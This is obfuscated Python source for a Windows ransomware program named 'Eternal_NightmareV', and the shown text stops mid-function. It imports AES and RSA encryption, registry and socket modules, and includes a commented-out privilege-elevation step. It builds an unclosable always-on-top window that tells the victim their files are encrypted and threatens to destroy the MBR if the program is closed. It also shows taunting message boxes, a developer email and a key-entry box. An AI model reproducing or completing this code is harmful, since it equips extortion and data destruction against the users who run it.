from asyncio import subprocess #line:1
from encodings import utf_8 #line:2
from ssl import PEM_cert_to_DER_cert #line:3
import threading #line:4
from tkinter import messagebox #line:5
from tkinter import *#line:6
import time #line:7
import tkinter .messagebox as msgbox #line:8
import tkinter .font #line:9
import tkinter .ttk as ttk #line:10
import glob #line:11
import os ,random ,struct #line:12
from Cryptodome .Cipher import AES #line:13
from Crypto .Cipher import PKCS1_OAEP #line:14
from Crypto .PublicKey import RSA #line:15
import sys #line:16
from winreg import *#line:17
import subprocess #line:18
import shutil #line:19
import hashlib #line:20
import platform #line:21
import struct #line:22
from socket import *#line:23
import win32com .shell .shell as shell #line:24
__all__ =[]#line:25
#if sys .argv [-1 ]!='asadmin':#line:28
    #OO00O00O000000OO0 =os .path .abspath (sys .argv [0 ])#line:29
    #O0OO0OO0OOOO0O0O0 =' '.join ([OO00O00O000000OO0 ]+sys .argv [1 :]+['asadmin'])#line:30
    #shell .ShellExecuteEx (lpVerb ='runas',lpFile =sys .executable ,lpParameters =O0OO0OO0OOOO0O0O0 )#line:31
    #sys .exit (0 )#line:32
O0O00000OO0OO00OO =Tk ()#line:34
OOO0000OO00O00OOO =None #line:35
O0O00OOOO0OOOOO00 =None #line:36
OOO0OO0O0O000000O =os .getcwd ()#line:37
OOO00000OOO00O000 =OOO0OO0O0O000000O .split ("\\")[2 ]#line:38
OO0O00OO00OOOOO00 ="C:\\Users\\"+OOO00000OOO00O000 #line:39
O0O00000OO0OO00OO .title ("")#line:40
O0O00000OO0OO00OO .geometry ('1000x600-800+300')#line:41
O0O00000OO0OO00OO .resizable (width =0 ,height =0 )#line:42
O0O00000OO0OO00OO .configure (bg ="black")#line:43
O0O00000OO0OO00OO .wm_attributes ("-topmost",1 )#line:44
O0O00000OO0OO00OO .overrideredirect (True )#line:45
O0000OOOO000OO0O0 =tkinter .font .Font (family ="Consolas",size =18 )#line:46
OO0O000O0O0O0O0O0 =tkinter .font .Font (family ="Consolas",size =14 )#line:47
O0O0O0000O000OOOO =tkinter .font .Font (family ="Consolas",size =19 )#line:48
OO0OOO00O0OOOO0OO =tkinter .font .Font (family ="Consolas",size =16 )#line:49
O000OO0OO0OO000O0 =0 #line:50
def OOOO000O0OO000O0O ():#line:52
    global O000OO0OO0OO000O0 #line:53
    O000OO0OO0OO000O0 =10 #line:54
    time .sleep (0.5 )#line:55
    OO000O0O00OO00000 =threading .Thread (target =O0OOO000OOO00OO0O ).start ()#line:56
OO0O000OO0000OOOO =4 #line:57
def OO000O0OOOO000OOO ():#line:59
    global OO0O000OO0000OOOO #line:60
    global O000OO0OO0OO000O0 #line:61
    if OO0O000OO0000OOOO ==4 :#line:62
        OO0O000OO0000OOOO -=1 #line:63
    elif OO0O000OO0000OOOO ==3 :#line:64
        OO0O000OO0000OOOO -=1 #line:65
        messagebox .showinfo (":)","I think you made a mistake :)")#line:66
    elif OO0O000OO0000OOOO ==2 :#line:67
        OO0O000OO0000OOOO -=1 #line:68
        messagebox .showwarning (":(","This is your last chance, there's no more chance, think carefully :( ")#line:69
    elif OO0O000OO0000OOOO ==1 :#line:70
        OO0O000OO0000OOOO -=1 #line:71
        messagebox .showinfo (":D","You turned down all 3 chances I gave you :D But I'm happy I got to destroy your computer!")#line:72
        messagebox .showinfo ("good bye","It's been fun so far. Goodbye and see you later!")#line:73
        messagebox .showinfo ("surprised?","Actually, it's all a lie. You activated the secret code. From now on, I will restore all your files :D But don't touch anything during the recovery, otherwise your data may be corrupted!")#line:74
        time .sleep (0.2 )#line:75
        OOOO000O0OO000O0O ()#line:76
    else :#line:77
        messagebox .showerror ("None","The nightmare has already begun, you can't stop")#line:78
O0O00000OO0OO00OO .protocol ("WM_DELETE_WINDOW",OO000O0OOOO000OOO )#line:80
OO00OO00000OO00O0 =Canvas (O0O00000OO0OO00OO ,width =570 ,height =274 ,bd =0 ,highlightthickness =0 )#line:81
OO00OO00000OO00O0 .place ()#line:82
O0OO0O0000OO00OOO =Listbox (O0O00000OO0OO00OO ,width =110 ,height =30 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",relief ="groove",bd =4 )#line:83
O0OO0O0000OO00OOO .place (x =0 ,y =50 )#line:84
OO0O00O00OOO000OO =Listbox (O0O00000OO0OO00OO ,width =30 ,height =30 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",xscrollcommand ="Scrollbar",relief ="groove",bd =3 )#line:85
OO0O00O00OOO000OO .place (x =780 ,y =50 )#line:86
OO000OO0O0OO0OOO0 =Scrollbar (O0O00000OO0OO00OO ,orient ="horizontal",command =OO0O00O00OOO000OO .xview )#line:87
OO000OO0O0OO0OOO0 .place ()#line:88
OOOOOOOO00OO0OOO0 =Entry (O0O00000OO0OO00OO ,width =51 ,bg ="black",fg ="red",relief ="groove",font =O0000OOOO000OO0O0 ,bd =4 )#line:89
OOOOOOOO00OO0OOO0 .place (x =0 ,y =550 )#line:90
def OO0OO0OOOOOOO0OO0 (OO0O0O00OOOO00OO0 =32 ,OOO0O0OO00OOOO0OO ="v_GbjBb9ZnD^&!AeY3Cp35GFD5TscaHeG4ZvFzbA**Uwn3hRe%j!CTd%2E#CR3X%7bb8QC8b^eYVaCm^Y6UHDFArQxQfNXdF6+WX7Gj8uEgU8!aE2wMgN+D!uC^fw$FBtayc$Z4!Dybdduaf!tqWHryg#&nTVf%vpYfVwR&@CjgEexRjfv5@3jCT4CsXqqA3zdU3qv4=eeuR_PJ%WS@v4WUtA@bwA7KrMH2Ke8bCJnq$J?nAmAQpBEp&zJWBG##2KTN4P?mXCYXPwGKjffzXwJwsqNgwA+rFBLmhvV3QvnYQ#vdMUYk_cnG8@fE9*!=S?eCv*^c?Dr-G&7ZXM#n%56=KA55gkF@!k&7DHrMzDMkNrgS#v$T$yBF2mZBuh-p_h-N7NEkU7-yj53D2+qBgd^dbx6QHYAw9pJrV&-#JZjs#@Le&rUSk3nqWKE%$q6q&J^2TEEnRxqa7@6w_m8tab!j^sSxwQA3Ed@@3b3@!6LyX$e56hsnBZhUMhfrVG8pgCEts%+nrSbv$?cXpkL2MSWmVh_VSfDHTDTLF@RTx63cfWVfjn22wvu+u8Yv-%mf4V@78yQvp49tQZTnGhCvGp#QH#a-r^5fY-vH*WZ_qe6=aN?r$A9+5!b=jx-%yVQw?ETZN*M+hZB#=Wg&5rK-?-#W*xcmdXL+NC2Z3&A6yJ$GG#ApH$4UsJ7NuEeaK=QVk&mSwNj?%gmdQhmjGE=Y7%m^wb?8?ZwypDFbcJuyNvtSW+!KnLv^WA^KYbXu86LaHrK@wB+QXwA@K9k5XS-TQt7tp&X9jJ#drn8KEMXFw$$dg+xS#RtLH^mp3CpRZyMRUWcZe3jedpymZbjAjR=?YgDXGuz$fjs+SC%@vu*PxRE=4X*k96jX#2YHvDw8sH$6ZURC2*f2ac&f2EN7MapzZ-QJdnqv6*BqsxATHZp*RfXaKw28d$&Zk!44A#DE7rcr_GujKrG@3L94pV_5a+Efg#@pr&9T?Yh5ctq%L#yt^g-S4g@^WAz#ytVz4MyrM_y#P@@_#Jb8yDP3-+xU8pCnFS#hcK=rH5g=WCxBthHPF_%@kJyB7muxrsu_R$52$GtBg9hSn_adqYaRxyUXdp9EB*_mrhtkF2R@Dk=T&DyF-TCH+%UjyMb2V$*N_WKY=AVnrTCe*?xK!HtWChE*gy4E@=Q=69hrKtWuL5Rns&Tnze&XH?4KXp49@+MY&cBS%@G3_pBwSCN$SnLehwqE5Vgz2nWc!CTWPAB9eHMXPL^^Rgzs_8NG=nV4Q+$TkchdZbwe=5#G5BG!=xqfksd7MjWwkSX9FwgE=UGHxc=A_ZKkdFxD?fSSCfnZ%+FBsHFpCT_Paa%HsgmQRpTnr5qZ3?Wvhba-YkM5?2mWf7r3b$GBy^g4&W=jQ%XKNr!UyVmPNMbTn*f_7L=!y2A#KjmNcUVw#q#^NCNH$9n5xEe5MGaD6qpserZj-Fw7c5NAfWT=s7rhSS?F8tL?H977a#+uvdmyW-qnPyt@qde&$$U8C*?5qvXU5c8Wnh$tq3@emktf4mF##*a=ywttp4dFe3Pc3eyZ3m9s8FpQN?+pt%3^8vh4pGMah$52*mzG9N4A#3e#q_BqeRKx%2gFG^Mg$h$3+^rrQR8qN*7bSzTdW5K8$$mJFu9S4$d57_+&r_+xLkBcWY7mfXh#J@fy*Vs&uxLVnU?B8DXLe3&^uXSQ3mhsCcBzGE7=@58&Nkpb67g^K572Q93j!Umknhr+h6!HB8N6s-LcW6Qsx#e4NSfA=BT$VE4BCRrtPTa*MNtkD^_r8T?bSrCQ2=X8Np@Hx=@9NQG7G-9qU@3aHPg^b!cD&69^*YX^69emrn6LMpWbFx!tzkz+3C#3yTG5R^7%dzE^AWh!Chy=mK9j%Yb2Xj3NKL!dRPk@@c4w-za+-bEv6eMjhtug$LLHE_qs*#_mVkf9Y$RvHf&8kYjHTCdYDnzSAnKGk^PqsuYu%eeaU3##%tmYwc8KjmCEY!Sd?j3X*&?+JL=QKzPXd%bjZ@PHtHmEJPWf@&6SF4&VnE8^!eJXBazAc#8ZPmpTPz5M-rF3Q*XLuD_YY@=P?8C#%DYB@b?z-6Vhd?FTyDb=ws4?YC$-f58=*fdCMZs3j^e7Q92peB$bp2Hyu2h%+vAu#LS4h#Tv^j*=g@cZ+H5@h$G_hu35Ej3s$-fRUueqAGAQMTfsuUCaX9Z6cm-gJYw=@F9_8A!APA3dR!!LpLjYSMM-!@pJzpn*u74AxzQM_%gaP_wg$#^f$QNVT_*3-S#4+LnL3MQh*TuDu45uUe!g9h!*9$-^6HD#YqS_9d!&qMnf3cp+!nQ%26#3EMpbeDH9KWJe!TNfSa8&y3nnxrWg7LVgK_zbhb$jLuzpYQsXyq7U4gnQyzwE$+7VWQZ52vH5G*5B4crZBQVX#p+^?LQMH!_u&#G?$dVdDPS&_Vep#fWdK6pr6H_Q?sEPYmgj3c-H5$fVU!5Z3WQecfeAm6vD+hF+EWhR8?48&HR=_cGu?&MtZphzU5!RD@n9BazLV9zVfA=d_jVMA9b^y==VXX-cj3E_75exG*j-u5+2tVYyc*fFBNhuaRY_vVF82%dW33dSaRs^nMSVPprbrXQ-p--e7%6MG9ryUWUT4k%s@-ebXA2PXPeqH*%bNqxK&QsYML7hN_na*r_!G96-s@6cZbTQjYky2UjLeZyCfQLGvfJtNnA*$3_8gu*QNM-PNR!7eEy6W-vs$gxDyckKm&v%zECwcfn4GgYnTmwKf2SYep%xQx*YuhhK=c=CJ2f6hWAQnw8penG&Z4Nn++Ngee^SEpPRg^HTdM*pHXtdB4xZE=Y2K6jp#2gs7+gW6VE+c6%3@2%EX+deYJsMkpqN$QJ^g+%vSUF?wh@WgLQZVpKfkb_MzXc*zRZ-bkWH*F3vgMnN67W55X^G#QyUZrxFGWV6=fxQ#e#v?yRFjQZfXf^XP3MG@+UF!E+kGyuPf%K9Ga=Wbkx7PfGYjwUt+B$U_ubbKt#JEY!wbFgs@KEbL#Tgggjz?ub=jN%Q6QwH#aKKAw2kw#4!_dLyZvbM5Sz4qtpJeGUjNtJYvSJZ$w@AKzr4xC#-K5eTDmXcqL#y_Z#&59bL7cdVZfsv?yd$Gt-_DNyGeGQqxubDUQTt9KNu^_ybUTKkaevTsrP*pRzM=n#M6K4@X&%F4x$JeUTa@69#+&%wW%GTJz93v9+^DF6es6tGwdZbTrM=q9CNXe3Rs_V!wY-QS+TAW5PX3gffYfYJzA=g+RNuDMd#W7y*!sWc4XP8Dm=TWWYqn7A@K#8=8J+s8WMCxJDgBc7QjFtK4MWQ_66yf#Xj=_L2VVT-5U-6wenV@cXTM_fKtMP@-MmJ!GWrM646Q=H-aThGUav266kUXE_ZC^^%YV$QfNS*WV@r_txUkYshdZ4byCkU$!rycU$b?p9SeHqQg@g5unf#Z3a_QW54n!CTK!W^GzzvQjYbq8WcNRQMtRgZQg+GAxPWe3Fh4ZEPcjbcUDY#WY+MhEQBAh*t4Q2=e2QMGanNSzn%S&Az2?DzJHKQ#x*6DPqTJ_K-VZve5LJpztsF?2H@mUx$s#&?Z8FCQ3m@3aRxMJ&HaT*b&%Pg-sEW-?9f%n6Z2Kwku+bZGYr45_Q3BGbNj-a_ERQ9&Lxh8yGWh6yGDfu9&NR39NB&VDC%Hz=k#LWH57+%&*s-R7rWEgfsbN$-g!T+y?3@g+&@qS-bVZvF_$je-k$CKM9Zf#A6eP!XP!Ev^F_Z6_bsKuW!hDFNkLxX7R%d-V9h?FaLMEygpHPKs3f@eSet3etM^%^tNavbNFb4gfb**QYp#A4@UgJqkmABnL9zq8TExQ4F4d?zRmDE8Ras=rr49aD-E7L&CY*V2?7M6?3+27THuWWBkzfkxVrHn@a8bebeuMNt8*tAG*YGdL!c@BPryvcuxXM%jKdcB@h&fap9GFa@7Y3!Ekvb@Fr&AEegGuYRd@x+W%%QbZf4ga2aNRPVpTn!cyB3f+Q3AWZSHvYy5#_b@L!W94+4Mh@^fZQUkTs?zXRmgRK#c#9p*xf9@pUgdz4k@YNKk@5eBrSgXyCPM$jts?2J94R7PuA!-VcuU@ZYeK?J&wuGw2GfY?LW#rGkefQZw?sR=uScYc=5+NR5n5Jf?K#qd#yjkZNcg!JmLt=-RTjN=^5uRqcwxgu7ESM%rjBPz!Te*NFb=rx^G5r$hYXYRf@$JTB?M#z5-p3#vgcdzn4Xz9Kh67Fp%Cdzd2F4*!uMuLw=Sv!%8hYSj?KMPA2J_nUcG$zg#Jm%rSbV8=N4PZR6=ftGKt2Lw4-r_^A6fV5sFv8QDEbpE?G##!eQ$aqu*ZxX+4ruYXfBL_h$nMsJYWa4W@q4#&3xuHC&-Vm5q$PVQYzd=nzGcjFhnYdSMJUWAqSaeHbesZSeDex+7vZbLY&f*C6kC@GV!rWj4AhFU4ktmhyBzrp_wyC_$=bVW%@M*+#LFQ9Z4h?rL6^A3-FE+Q^jhR2cc@A!ccG%FayF3gV_SL&Hk2hf47!njRN&prTN2?PxXLXA-Tda+?g-vhj=m8-fypG4V=2L5Pd!pg4nDSejPAyMc%jBcMc+=PfU=CQpEgYS69r&a@VM=cQUThw&$3mPa@m-Fgs@#Rr8%$-fh*unC#*M^%@Hw7uEvdYYqAP5zQGaurFVn8N=!u#DUcLrEnn38Upu#u-QXAUx8UgH_cw+%8&q4Fk2VrcTRK#-e7&sbud4mNuvQR4F$7T!qNphK9UTZVGDS9^NH86tRtDQcCucwzsh%PnC5*PZcnnFkV?mjJh9LA#VBp7DZdZ@22rrw4XhATN9!bGzEeQPE7%fj@VWQHS=88hEHgbD8rVH@ZzjTb6gzBVGe25rxNW9SPHF5ptnTe5Z&YUeM3*+b9AXNe8@$rwxgAxeXZgMVJehgtX2!pJFT%RWr9749e5?cC$9c#*eTp*Htg@sLsypY!VF^hXUrV@g%N=u6e+N4sLPL+xJ@N@4SRnF8TRH!Lrh+3cp6?MzU%@mDHQ9Cd_@u4gb@3P5faXuP5BgYG*dLgNS@J@xy&+ujpsEQK&HKeXUKYNQKvP7Z^Ck#sueeG=7nCAyVHCmV&eK!s=Ysnfhy!q6!yZkQhXZbc3N-=XGvSZttD+!jB7!_&4-5Za@x#WK65rk6xwEzjvyvGCCcMcTLUmFQf*xb+qjBT!A7L#aRfX5&G@GL%_F!4%hW_tdsF?PX!$PBcX&a74Q#bBwQBd-6W@S9dq&TTE&&&9$H5WhT-@%Z$%#-SHmR8Q@K85Cuc?@tCnhG=TTt34bt$HXxy-DyFtP?VgpqW+X9$ZwATcjfX9Nyq@pR*pbtnP@3EUV^tnm@yhF#NsjJPAhZj$?!6%Z@xrmu=+5=z=Ba+$TG_USS8+hdLN+JcFUw8Q^gts3m$QX2!xqr7HcPNqVk3Fq+FMhk2^+UMvz9^jKHV4-N$xtThrmW?-xTgVuvt!?va$REQD$+-KMA48vSE6a@U&s72zk?GX3LpP=D-j_B&43YL#Fb*ps6ChejR#BKWz+52qdhw9+WLeFBz-jHabJKY9u$3xHHy=58_9tJC+XRDYY9T=Pbf?KWkz3ENQKBwz?td$Gs8Kc=tC8$hdk2XqvGr@G&D?=BbXR7GWJK_&w?HV*$N5EZe$F%Z_p2TH_?hZznPXKF#w_-rd!m!c2-grB6V%va6Y@A&P&mkX^VJa7K-AHkaVKAbnwRuq$xgNe^*d8m3xgTSxgUvX5_bF343R4=hTWmgY8e+bP98v53Dw#_v5_6Sty8PVRTmhsGRu@RR8z7U+gr@VxvgG6dSZ*fvta2p3ZuGz_JfR*QVh^bA%#N^?n@swADMXu_f+X&hcpRm+pDu%y-CNMM*_%7P&#&6&mafs&yD_V5gqC7NMEw6caf_?d*B2V&MX4WueAs_#h&@mj&cAt*YwcuEua^^%QFhPM-a98heWbRB-yQ#gSZLbJ983+WADVF4yQckAV2Zj-=ubd^j!fdQ!FA4mgUxGb+b+Up!3_4jL@PUMtxDGh!jbrCPSf9Y7JFpNAMqTupF*5A$kYf=DMANSLKwNs-%WdyZqW4Yz%&3vfE$xeA7LDpx48s7TU8mYRbF9eH98Tb#Qy4TK*6MN+uV6+3F+QSDAj9CWzmmDbFS2=t@d3Ynsj6TjtVpEn^W4$uMT*NC7dnR&$rs$a=C*KnKHz-xcpRje4TtseWZqQ9Kt6F^w7wCh9uy23E?XgT-nzm=+K4qYvZ@A9PWQwSua_#RU$dg*XzFBb9^&HK8zQv++ZcMRgH9uhmfk@z#c4*gJ9AK$M2n4zG%GscM%X6PNQsbVSgzkmLq-4_!Vzn4fK%*!3WaWdz?y5mAA#=xAbJXq*SpH&Wd5?qgM%+q5^sn*5KqxFpJYED2KX5?PeXLtV-6zA_KD8xKu=4c_@Nu*m=KQ2$veWM+WU9t?@f@W7ATufgL*gb2_S&CH2sfLJ=MURBd?EF^Tx&8@jM4v9h_n?N&@q3ckFu%&+qF4QvA6qZHBkatvGL*Zg!sF&@QE-TV6zJ2h*hqwxU@A-Q&zhnkgg*BExxHq#7Dh8+gZteCK&M?YKRh2Ye$vQB6c%3uq6@9zL=+Mn4araUY+FaZ3=QTMPyW!37^nLR@^LGNGEe&=aT?N_HU+gtn#h?t_9LFwd#jF3PzY7FffQCfJZZ^zSwz&YF2XQP?G9CBu5?m4C&xjg8F%f?VmfNf34j^msM4N3SF+rGZNt&*zp$5??xzZA!ceXe2wD5FyVB@Ac_#y-jaPB-Gu?#zm$yU6&xHTxFc=zZEVGy-DF7VGnTb#Kpsqzr$K6urH*BT=9Nke??$6m*HwYc2*mV!9L_^J%SuYLsA8kLf?5ZN8baQ+u5ZD3-4dDEHxeZ-T%HE=z?vx$&9*dTUg!-97PQ*sLmwjkP6^A*+Rb*wLxDud@Hm+Mh&SabMTNWZGPDWWAa$MJmas!H7jW@JFVJeu4D!#N7?b#V%Q=3hdAgWMN63W!6apbWM=DxcLBL=MxR9EDv+K^6_A%xHf_uq9zc_JQ6CXPWHCDLt*J*Cn-VzFZ#8B^FEqwzPu6m^CTWTRH3-PpH!cqdd9KT__N&$RGRRPwkwrfQc98YPQF8WR-nhArfVjh#7y5tJ4jzSkFEmvJfqp%u8BhL&TVATs2DkYUvMcG9ET8Avg#ZrMuUJ4r979a=y5$bG9n@gT^_J$ZG+X9^LEh@_x#H4sHQF-GV73?AF*P!^VDs4ux5eGkCCa2Z=@3E*!B^7Y8%!hYvbPghspjV=vVKK#*BX_*JV7LcLWACh6^@^!Ww5Py$Bv+Z=FyqZ#3b@yRDckNz=*-!T_uMtYcd#uBs#+g#=5d27GMVJt8sERA5d7Z+hZ96kn4xhDG_wkEQ7ShvcqAWRSbgpY&Ebd^DC#7XxMx4^Ajcp*+H3mEA$9vU8-7b!=93amyKv%!jkDh#DejYtgfzt+mNn@-9E!Jp9?sEzVhcHw4e5vg86YsdJpD?58tDRZqMa3KeA#%FmEjH*fV-hq@h%mHsRrbx&n%K5Z-aM?Y8@v5jx-ZyyXA=wjbHac!-d4q^HTe*$qhTf*Cd7%&4^5q-=@UtLFNP@#YxFYeZ-khJG-Q8gus#A99dZq4A3QBTxDFxYW5gW-@gdEF^WZUQ^Z*QUAcxKjR#57$K8an3ugh6AuJPP9H5!QYqy!Eck68RQg4?X#vfpCkAQd&yMp9bqY!takQ^7?dgn==cz8TvqXbV=bK3WY396K389Z#G#jUE?Ed%9dMHXNf7uaZsXejxULxZQxvNme&5mTrT=Sy3vC4-VJ=_DXRyZ5Z&hMWyw+NKY?Gf8EG8YMmn54gfkWZATfJm&3ABjTgyT_z%^Q4Z#4N@mPG!drCXRLmX$RMWscA6KadnuVe@GRMQcWr6jFWfCbfzStbQNXSGy5@euNTwJ4$hA5%Ccjv*eDBLv@^-vk+$gx#PjY6tXQXf2W%C+$jwqrqwjjzffte%L7s8sXajZqX6nMg6KtPF^uKGVKQYY?KyZr^p7S+%c6-aXbCmaPnqSpLTDQN*NKQ-J&T&ERqyyVM_?f!uWMqz&dnZJ3e5VFvKeJKW*B*qC#FpDCfXmbexUSLpSAEE7ZJyawW*ERUY&MLZZM$ZknTfP+4q84cg-fcXfSFTsa=PR2urbE&yQxmW7&E_eD-g%bDM+t3%MubRMTkhc%9C9!*pZFXbYDHB%ndCuM#6Ma=aC+TjA@Az-Y=*+dMkDyauK#P!4c47GzX9Dxha6v?Enm@=nwQ$7VNNVs8+BH*XahXz"):#line:92
    return ''.join (random .choice (OOO0O0OO00OOOO0OO )for _OOOOO0OOOOO0O00OO in range (OO0O0O00OOOO00OO0 ))#line:93
OOO0O0O0O0OOOOO00 =bytes (OO0OO0OOOOOOO0OO0 (32 ).encode ())#line:94
O0OO0O0000OO00OOO .insert (0 ,OOO0O0O0O0OOOOO00 )#line:95
O0O00OO0O0OOOO0O0 =''#line:96
def OO0O0O0OOO0000OO0 (O0OOOOO0O00O0O000 =64 ,O0OO0OO00O0O00O00 ="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"):#line:98
    return ''.join (random .choice (O0OO0OO00O0O00O00 )for _O000OO0O0OOO00000 in range (O0OOOOO0O00O0O000 ))#line:99
def OOOOOO000OOOOO000 ():#line:101
    O0OO0O0000OO00OOO .insert (0 ,"")#line:102
    O0OO0O0000OO00OOO .insert (1 ,"If you close this program or try to reboot your computer,")#line:103
    O0OO0O0000OO00OOO .insert (2 ,"this program will destroy your computer's MBR system and destroy all information!")#line:104
    O0OO0O0000OO00OOO .insert (3 ,"Be careful not to turn off this program")#line:105
    O0OO0O0000OO00OOO .insert (4 ,'')#line:106
    O0OO0O0000OO00OOO .insert (5 ,"--Q:What happened to my computer?")#line:107
    O0OO0O0000OO00OOO .insert (6 ,"--A:Hello! new victim? You are infected with Eternal_NightmareV ransomware We inform you that all your files are encrypted.")#line:108
    O0OO0O0000OO00OOO .insert (7 ,"--A:All your files are encrypted and protected using a strong military-grade encryption algorithm using random keys, random vectors, and random extensions!")#line:109
    O0OO0O0000OO00OOO .insert (8 ,'')#line:110
    O0OO0O0000OO00OOO .insert (9 ,"--Q: How can I get my files back?")#line:111
    O0OO0O0000OO00OOO .insert (10 ,"--A: Other ransomware will restore the files if the victim pays them, ")#line:112
    O0OO0O0000OO00OOO .insert (11 ,"    but I'm different I was developed solely for the purpose of destroying the files of the victims :)")#line:113
    O0OO0O0000OO00OOO .insert (12 ,'')#line:114
    O0OO0O0000OO00OOO .insert (13 ,"--Q: Can't really recover my files?")#line:115
    O0OO0O0000OO00OOO .insert (14 ,"--A: If you really want to, please report to the developer's email that you have been attacked by this ransomware,")#line:116
    O0OO0O0000OO00OOO .insert (15 ,"     in some cases it can be restored :)")#line:117
    O0OO0O0000OO00OOO .insert (16 ,'')#line:118
    O0OO0O0000OO00OOO .insert (17 ,"--Q: Please provide the developer's email")#line:119
    O0OO0O0000OO00OOO .insert (18 ,"--A: ewgsghse@gmail.com this is the developer's email :P")#line:120
    O0OO0O0000OO00OOO .insert (19 ,'')#line:121
    O0OO0O0000OO00OOO .insert (20 ,"**Developer Says: Just Enjoy! This is a terrible nightmare that will never end!")#line:122
    O0OO0O0000OO00OOO .insert (21 ,"But if a lot of people really want their files to be recovered, it might end someday!")#line:123
    msgbox .showwarning (":D","warning! You can turn this program off if you wish."+"\n"+"\n"+" However, if you close this program, the key value stored in the program's volatile memory will be lost and your files will be permanently destroyed!!"+"\n"+"\n"+"So I do not recommend that you turn this program off")#line:124
    msgbox .showwarning (":D","You have 5 chances to enter the key, and if you enter the wrong key more than 5 times, all your keys and vectors will be destroyed immediately and you will never be able to recover the file again. Please enter your key carefully.")#line:125

def O0OO0OO0OO0O00000 ():#line:127
    global OOO0OOOO00OOOOO0O
    OO0O00O00OOO000OO .delete (0 ,END )#line:129
    for OO0O0OOOO00OO000O in range (0 ,len (OOO0OOOO00OOOOO0O )):#line:130
        O0O00000OO0OO00OO .update_idletasks ()#line:131
        OOOO000OO00O0O0O0 ['value']=OO0O0OOOO00OO000O /len (OOO0OOOO00OOOOO0O )*100 #line:132
        OO0O00O00OOO000OO .insert (0 ,OOO0OOOO00OOOOO0O [OO0O0OOOO00OO000O :OO0O0OOOO00OO000O +1 ])#line:133
    
def prgrs():
    ddddd =threading .Thread (target =O0OO0OO0OO0O00000 ).start ()#line:149

def OOOO0OO0OOO0O0O0O ():#line:135
    O0OO0O0000OO00OOO .delete (0 ,END )#line:136
    OOOOOOOO00OO0OOO0 .delete (0 ,END )#line:137
    msgbox .showinfo ("Clear","Clear done!")#line:138
OOOOOO0O00O0O00O0 =0 #line:140
OO0O00OO00O0O0O0O =1000000 #line:141
O0000000OO0OOOOOO =100 #line:142
OO00OOOOOO0OO0O0O =0 #line:143
OOO000OO0O0O0OO00 =0 #line:144
O0000OO00OOO0O0O0 =""#line:145
O0OO00000O0OO00OO =[]#line:146
def OOO00O000000000O0 ():#line:148
    O0O00OOO0O000OOOO =threading .Thread (target =OO0OOOO00O00O0O0O ).start ()#line:149
    global O0000OOOO000OO0O0 #line:150
    global OO0O000O0O0O0O0O0 #line:151
    global O0O0O0000O000OOOO #line:152
    global OO0OOO00O0OOOO0OO #line:153
